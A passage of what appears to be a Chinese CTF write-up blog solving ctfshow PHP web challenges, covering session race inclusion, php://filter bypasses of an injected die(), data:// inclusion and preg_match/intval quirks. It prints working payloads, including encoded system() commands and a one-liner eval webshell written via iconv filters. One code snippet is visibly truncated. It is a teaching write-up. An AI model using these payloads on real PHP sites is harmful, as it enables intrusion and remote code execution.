<li>存在文件包含漏洞</li>
<li>知道session文件存放路径，可以尝试默认路径</li>
<li>具有读取和写入session文件的权限</li>
</ol></blockquote>
<p>这两个脚本理论上适用于<code>web82-web86</code></p>
<h4 id="web83">web83<a hidden class="anchor" aria-hidden="true" href="#web83">#</a></h4>
<p>web83的开篇设置了session_unset();session_destroy();</p>
<blockquote>
<p>session_unset()：释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的。
session_destroy()：删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留。</p></blockquote>
<p>就是释放和清除了前面所有session变量和文件，但是我们的解题思路是竞争上传那一瞬间创建的session，所以不影响。</p>
<h4 id="web84">web84<a hidden class="anchor" aria-hidden="true" href="#web84">#</a></h4>
<p>加上了一个<code>system(rm -rf /tmp/*);</code>，但是因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）</p>
<h4 id="web85">web85<a hidden class="anchor" aria-hidden="true" href="#web85">#</a></h4>
<p>添加了一个内容识别，如果有&lt;就die，依旧可以竞争。</p>
<h4 id="web86">web86<a hidden class="anchor" aria-hidden="true" href="#web86">#</a></h4>
<p>dirname(<strong>FILE</strong>)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。
include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。
脚本里用的是完整路径，不影响竞争。</p>
<blockquote>
<p>web82-86：参考https://blog.csdn.net/m0_48780534/article/details/125410757</p></blockquote>
<h4 id="web87">web87<a hidden class="anchor" aria-hidden="true" href="#web87">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 21:57:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="s2">&#34;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&#34;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>使用 <code>file_put_contents</code> 函数将经过处理后的内容写入到文件中。写入的内容是先拼接了一个 <code>&lt;?php die('大佬别秀了');?&gt;</code> 字符串,用于在后续如果有人直接访问写入后的文件时，防止文件内容被直接执行而显示一些提示信息，然后再拼接上从 <code>$_POST</code> 中获取的 <code>$content</code> 变量的值。</p></blockquote>
<p>这道题需要用到php://filter</p>
<h5 id="phpfilter的使用">php://filter的使用<a hidden class="anchor" aria-hidden="true" href="#phpfilter的使用">#</a></h5>
<p>原文：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用 | 离别歌</a></p>
<p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
<pre tabindex="0"><code>readfile(&#34;php://filter/read=convert.base64-encode/resource=php://input&#34;);
</code></pre><p>如下：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/0f851469385893.png"><img alt="QQ截图20160724234603.png" loading="lazy" src="assets/thum-0f851469385893.png"></a></p>
<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p>
<p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/693b1469385893.png"><img alt="QQ截图20160724235335.png" loading="lazy" src="assets/thum-693b1469385893.png"></a></p>
<hr>
<p>回归正题</p>
<p>我们审一下这道题目的代码</p>
<p>相比上一道题这题增加了一个post参数，且会将传入的参数进行拼接后写入文件</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"> <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"> <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="s2">&#34;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&#34;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
</span></span></code></pre></div><p>这道题在<code>$content</code>和<code>$file</code>之间拼接了一个<?php die('大佬别秀了');?>，导致即使我们成功写入一句话，也执行不了</p>
<p>我们如何绕过这个die呢？</p>
<p>其实我们可以通过php://filter流的base64-decode方法来去除这个die</p>
<p>因为php在解码base64编码的时候会先将不属于base64中的字符去除，再进行转换，如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;|[^a-z0-9A-Z+/]|s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p>所以，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、、(、) 、&lsquo;空格等字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符。</p>
<p><code>”phpdie“</code>一共6个字符，由于base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符。这样，&ldquo;phpdie&quot;被正常解码，而后面我们传入的webshell的base64内容也被正常解码。</p>
<p>同时由于会对传入的file进行url解码，所以需要对传入的file进行两次url编码</p>
<blockquote>
<p>warning!!!url编码需要连同英文字符一起进行转换，可以借助hackbar强制进行转换（找了很久）</p></blockquote>
<p>poc:</p>
<pre tabindex="0"><code>原文：file=php://filter/write=convert.base64-decode/resource=shell.php

file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30
</code></pre><pre tabindex="0"><code>原文：content=&lt;?php system(&#39;cat fl0g.php&#39;);?&gt;

content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg==
</code></pre><p>访问shell.php,得到flag</p>
<p>其实还可以通过其他编码来进行绕过如rot13</p>
<p>更多<a href="https://xz.aliyun.com/t/8163?time__1311=n4%2BxnD0Dc7GQ0%3DDCDgADlhjm57IKvq0Ivo%2BimK%3Dx#toc-3">file_put_content和死亡·杂糅代码之缘 - 先知社区</a></p>
<h4 id="web88">web88<a hidden class="anchor" aria-hidden="true" href="#web88">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-17 02:27:25
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/php|\~|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题过滤了很多字符但是没有过滤:、/、;</p>
<p>poc</p>
<pre tabindex="0"><code>?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4
</code></pre><h4 id="web116">web116<a hidden class="anchor" aria-hidden="true" href="#web116">#</a></h4>
<p>拿到题目环境，发现是个视频，下载视频用binwalk扫一下</p>
<p><img alt="image-20250107142748584" loading="lazy" src="../assets/image-20250107142748584.png"></p>
<p>提取图片，发现是源码</p>
<p><img alt="image-20250107142550734" loading="lazy" src="../assets/image-20250107142550734.png"></p>
<p>直接get传参读flag</p>
<pre tabindex="0"><code>?file=flag.php
</code></pre><p><img alt="image-20250107143725806" loading="lazy" src="../assets/image-20250107143725806.png"></p>
<h4 id="web117">web117<a hidden class="anchor" aria-hidden="true" href="#web117">#</a></h4>
<p>web87的后续 死亡绕过</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: yu22x
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 18:16:59
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$x</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#39;</span><span class="p">,</span><span class="nv">$x</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;too young too simple sometimes naive!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;&lt;?php die();?&gt;&#34;</span><span class="o">.</span><span class="nv">$contents</span><span class="p">);</span>
</span></span></code></pre></div><p>这题过滤了一些php的协议和转换器</p>
<p>但是没过滤掉filter和convert</p>
<p>我们可以考虑用filter搭配convert.iconv.*过滤器来构造出payload</p>
<p>参考文章：<a href="https://blog.csdn.net/woshilnp/article/details/117266628">详解php://filter以及死亡绕过_filter绕过过滤-CSDN博客</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">                                                         <span class="cp">?&gt;</span><span class="err">&#39;);
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">echo $enc;
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>首先我们先将一句话木马从UCS-2BE转换成UCS-2LE</p>
<pre tabindex="0"><code>?&lt;hp pe@av(l_$EG[T]1;)&gt;?
</code></pre><p>接着构造payload将一句话木马从UCS-2LE转换回UCS-2BE，同时破坏掉<?php die();?></p>
<p>效果如下</p>
<p><img alt="image-20250108125928677" loading="lazy" src="assets/image-20250108125928677.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php
contents=?&lt;hp pe@av(l_$EG[T]1;)&gt;?
</code></pre><p>成功写入一句话木马，拿到flag</p>
<h3 id="php特性">php特性<a hidden class="anchor" aria-hidden="true" href="#php特性">#</a></h3>
<blockquote>
<p>参考网站：</p>
<p><a href="https://blog.csdn.net/qq_62046696/article/details/125272550">php一些特性函数（ctfshow）</a></p></blockquote>
<h4 id="web89">web89<a hidden class="anchor" aria-hidden="true" href="#web89">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-18 15:38:51
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题要用到数组绕过的特性来绕过preg_match的匹配</p>
<h5 id="preg_match函数">preg_match函数：<a hidden class="anchor" aria-hidden="true" href="#preg_match函数">#</a></h5>
<blockquote>
<p>preg_match函数是用于完成字符串的正则匹配的函数，如果找到一个匹配的，就返回1，否则就返回0。
preg_match只能处理字符串，如果传入的值是数组的话，就会报错，从而返回false，绕过了正则匹配。</p></blockquote>
<h5 id="intval函数">intval函数:<a hidden class="anchor" aria-hidden="true" href="#intval函数">#</a></h5>
<blockquote>
<ul>
<li>
<p>定义:intval()<code>函数是 PHP 中的一个内置函数。它用于获取变量的整数值。其基本语法是</code>intval($var, $base = 10)<code>。其中</code>$var<code>是要转换的变量，</code>$base<code>是可选参数，用于指定进制（当</code>$var`是字符串时），默认是十进制。</p>
</li>
<li>
<p>特性：</p>
<p>1.如果变量本身是整数，<code>intval()</code>函数会返回变量本身的值。</p>
<p>2.当变量是字符串时，<code>intval()</code>会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。</p>
<p>3.如果字符串以非数字字符开头，<code>intval()</code>会返回 0。</p>
<p>4.当第二个参数<code>$base</code>被指定时，<code>intval()</code>可以将字符串按照指定的进制转换为十进制整数。</p>
</li>
<li>
<p>注意事项</p>
<p>1.对于浮点数，<code>intval()</code>会直接截断小数部分，而不是进行四舍五入。</p>
<p>2.当处理超出整数范围的值时（在 PHP 中，根据平台和配置不同，整数范围有所不同），可能会出现意外的结果。例如，在 32 位系统上，<code>int</code>类型的最大值是<code>2147483647</code>，如果<code>intval()</code>处理的值超过这个范围，可能会导致数据丢失或者不正确的转换。</p>
</li>
</ul></blockquote>
<p>这道题直接用数组绕过</p>
<p>payload:</p>
<pre tabindex="0"><code>?num[]=1
</code></pre><h4 id="web90">web90<a hidden class="anchor" aria-hidden="true" href="#web90">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:06:11
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">===</span><span class="s2">&#34;4476&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">===</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>设置<code>$base = 0</code>能提供一种根据字符串内容自动判断进制来进行转换的灵活方式。</p>
<p>这道题可以利用intval的特性和php强比较的特性</p>
<blockquote>
<p>当变量是字符串时，<code>intval()</code>会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。</p></blockquote>
<p><img alt="image-20241130160847046" loading="lazy" src="assets/image-20241130160847046.png"></p>
<h4 id="web91">web91<a hidden class="anchor" aria-hidden="true" href="#web91">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:16:09
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
